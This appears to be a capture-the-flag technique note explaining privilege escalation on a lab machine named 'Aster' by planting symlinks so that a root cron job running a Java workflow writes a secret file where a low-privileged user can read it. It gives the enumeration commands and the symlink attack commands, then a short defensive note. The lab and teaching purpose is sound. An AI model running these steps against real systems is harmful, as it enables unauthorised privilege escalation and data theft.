# Java Cron Symlink Abuse

Privilege escalation by abusing a root cron job that executes or writes around a predictable Java artifact path. Used on: **Aster**.

## Why It Works

A root cron job repeatedly ran a Java workflow from `/root/java/`. The application logic checked for `/tmp/flag.dat` and wrote the secret to `/home/harry/root.txt`. By placing symlinks from predictable paths to attacker-controlled locations, the root-run workflow could be steered into writing the flag where the low-privileged user could read it.

## Prerequisites

- A root cron job runs a script or Java artifact on a predictable schedule.
- The target path is writable, replaceable, or can be influenced through symlinks.
- The application writes output to a predictable file.

## Enumeration

<!-- cmd: linux -->
```bash
cat /etc/crontab
jar xf Example_Root.jar
strings Example_Root.class
```

Used on: **Aster** - the cron entry ran `cd /root/java/ && bash run.sh` every minute.

## Symlink Attack

<!-- cmd: linux -->
```bash
ln -sf /tmp/malicious.jar /root/java/Example_Root.jar
ln -sf /tmp/root.txt /home/harry/root.txt
touch /tmp/flag.dat
cat /tmp/root.txt
```

## Defensive Note

Root cron jobs should use root-owned directories and files that unprivileged users cannot replace. Avoid following symlinks when writing privileged output.
